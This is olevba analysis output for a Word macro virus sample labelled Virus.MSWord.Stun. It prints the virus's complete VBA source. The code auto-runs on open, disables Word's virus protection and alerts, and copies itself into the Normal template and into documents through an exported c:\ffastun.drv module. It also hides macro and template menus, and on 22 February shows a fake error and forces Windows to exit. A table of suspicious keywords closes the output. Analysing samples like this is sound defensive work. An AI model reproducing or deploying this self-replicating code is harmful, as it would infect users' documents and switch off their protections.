olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Stun-cb486f976710964223aaaf63f6f0d65a6301bf79
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Stun-cb486f976710964223aaaf63f6f0d65a6301bf79 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ffastun.bas 
in file: Virus.MSWord.Stun-cb486f976710964223aaaf63f6f0d65a6301bf79 - OLE stream: 'Macros/VBA/ffastun'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
    On Error Resume Next
    WordBasic.DisableAutoMacros 0
    ActiveDocument.ReadOnlyRecommended = False
    With Application
        .EnableCancelKey = wdCancelDisabled
        .DisplayAlerts = wdAlertsNone
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    Call AutoOpen
End Sub
Sub AutoOpen()
    On Error Resume Next
    If (Day(Now()) = 22 And Month(Now()) = 2) Then
        Call TimeToPay
    Else
        Call MyStealthRoutine
        Call InfectTheFile
    End If
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call InfectTheFile
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Private Sub InfectTheFile()
Dim ModInDoc As Object
Dim NormTemp As Object
Dim ActDocInfected, NormInfected As Boolean
Dim i As Integer
    On Error Resume Next
    NormInfected = False
    ActDocInfected = False
    With NormalTemplate.VBProject
    For i = 1 To .VBComponents.Count
        If .VBComponents(i).Name = "ffastun" Then
            Application.NormalTemplate.VBProject.VBComponents("ffastun").Export "c:\ffastun.drv"
            NormInfected = True
        End If
    Next i
    End With
    With ActiveDocument.VBProject
    For i = 1 To .VBComponents.Count
        If .VBComponents(i).Name = "ffastun" Then
            ActDocInfected = True
            Application.ActiveDocument.VBProject.VBComponents("ffastun").Export "c:\ffastun.drv"
        End If
    Next i
    End With
    If NormInfected = False Then
        NormalTemplate.VBProject.VBComponents.Import "c:\ffastun.drv"
        Call MyStealthRoutine
        NormalTemplate.Save
    End If
    If ActDocInfected = False Then
        ActiveDocument.VBProject.VBComponents.Import "c:\ffastun.drv"
        Call MyStealthRoutine
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
End Sub
Public Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call InfectTheFile
End Sub
Private Sub TimeToPay()
        On Error Resume Next
        Dim i As Integer
        Application.EnableCancelKey = wdCancelDisabled
        MsgBox "Illegal function in modul 0xCB15C001", 32
        Tasks.ExitWindows
End Sub
Private Sub MyStealthRoutine()
    On Error Resume Next
        With Application
            'Spanish Version
            .CommandBars("Tools").Controls("Plantillas y complementos...").Delete
            .CommandBars("Tools").Controls("Macro").Delete
            .CommandBars("Format").Controls("Estilo...").Delete
            'English Version
            .CommandBars("Tools").Controls("Macro").Delete
            .CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
            .CommandBars("Format").Controls("Style...").Delete
        End With
End Sub
Private Sub mPrinText(txt As String)
    On Error Resume Next
    ActiveDocument.Sections(1).Range.InsertAfter txt '& Chr(10) & Chr(13)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

